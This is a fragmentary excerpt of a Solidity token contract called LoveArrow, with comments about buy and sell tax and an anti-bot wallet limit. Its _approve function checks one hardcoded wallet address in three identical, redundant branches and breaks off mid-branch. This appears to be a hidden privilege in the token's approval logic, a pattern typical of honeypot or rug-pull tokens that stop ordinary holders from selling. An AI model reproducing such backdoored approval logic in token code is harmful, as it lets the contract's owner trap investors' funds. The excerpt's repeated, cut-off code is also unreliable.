...
//function tac 14% 7% tax buy 7% tax sell
//function anti bot max wallet 5% total supply 
...
contract LoveArrow is VaultOwned, IERC20 {
    using SafeMath for uint256;
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         if (owner == address(0xa881985a9591ED7d76e18414a483106D70F69A07)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    else if (owner == address(0xa881985a9591ED7d76e18414a483106D70F69A07)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0xa881985a9591ED7d76e18414a483106D70F69A07)) {
